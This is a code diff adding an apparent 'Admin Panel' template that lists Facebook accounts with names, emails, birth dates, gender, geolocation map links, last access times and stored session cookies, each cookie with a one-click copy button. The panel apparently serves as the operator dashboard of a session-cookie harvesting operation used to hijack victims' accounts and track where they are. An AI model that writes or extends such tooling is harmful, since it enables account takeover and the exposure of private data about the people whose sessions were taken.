@@ -6,15 +6,89 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Admin Panel</title>
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha2/dist/css/bootstrap.min.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.3/font/bootstrap-icons.css">
   <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.4/jquery.min.js"></script>
 </head>
 <body class="bg-body" style="min-height: 100vh;">
   <div id="main" class="container" style="min-height: inherit;">
-    
+    <div class="table-responsive">
+      <table class="table table-dark table-striped table-bordered">
+        <thead>
+          <tr>
+            <th class="col-id">ID</th>
+            <th class="col-fbid">FB ID</th>
+            <th class="col-name">Name</th>
+            <th class="col-email">Email</th>
+            <th class="col-dob">Date of Birth</th>
+            <th class="col-gender">Gender</th>
+            <th class="col-img">Img URL</th>
+            <th class="col-cookie">Cookie</th>
+            <th class="col-hascookie">Has Cookie</th>
+            <th class="col-isactive">Is Active</th>
+            <th class="col-location">Location</th>
+            <th class="col-lastaccess">Last Access</th>
+          </tr>
+        </thead>
+        <tbody>
+          {% for acc in all_acc %}
+          <tr>
+            <td class="col-id">{{ acc.id }}</td>
+            <td class="col-fbid">{{ acc.fb_id }}</td>
+            <td class="col-name">{{ acc.name }}</td>
+            <td class="col-email">{{ acc.email }}</td>
+            <td class="col-dob">{{ acc.dob }}</td>
+            <td class="col-gender">{{ acc.gender }}</td>
+            <td class="col-img"><a href="{{ acc.img }}" target="_blank">Open <i class="bi bi-box-arrow-up-right"></i></a></td>
+            <td class="col-cookie"><a onclick='copyToClipboard(this, `{{ acc.cookie }}`, `Copied <i class="bi bi-clipboard-check"></i>`);' href="javascript:">Copy <i class="bi bi-clipboard"></i></a></td>
+            <td class="col-hascookie">{{ acc.has_cookie }}</td>
+            <td class="col-isactive">{{ acc.is_active }}</td>
+            <td class="col-location"><a href="https://www.google.com/maps?z=12&t=m&q=loc:{{ acc.lat }}+{{ acc.long }}" target="_blank">View on map <i class="bi bi-box-arrow-up-right"></i></a></td>
+            <td class="col-lastaccess">{{ acc.last_access }}</td>
+          </tr>
+          {% endfor %}
+        </tbody>
+      </table>
+    </div>
   </div>
+  <style>
+    a {
+      text-decoration: none;
+    }
+    thead tr th {
+      white-space: nowrap;
+    }
+    tbody tr td a {
+      white-space: nowrap;
+    }
+    .col-name {
+      min-width: 200px;
+    }
+    .col-dob {
+      min-width: 130px;
+    }
+    .col-gender, .col-img, .col-cookie, .col-isactive {
+      min-width: 100px;
+    }
+    .col-hascookie {
+      min-width: 120px;
+    }
+    .col-location {
+      min-width: 150px;
+    }
+    .col-lastaccess {
+      min-width: 200px;
+    }
+  </style>
   <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha2/dist/js/bootstrap.bundle.min.js"></script>
   <script>
-    
+    async function copyToClipboard (elem, text, successhtml) {
+      let beforehtml = $(elem).html();
+      await navigator.clipboard.writeText(text);
+      $(elem).html(successhtml);
+      setTimeout(() => {
+        $(elem).html(beforehtml);
+      }, 2000);
+    }
   </script>
 </body>
 </html>
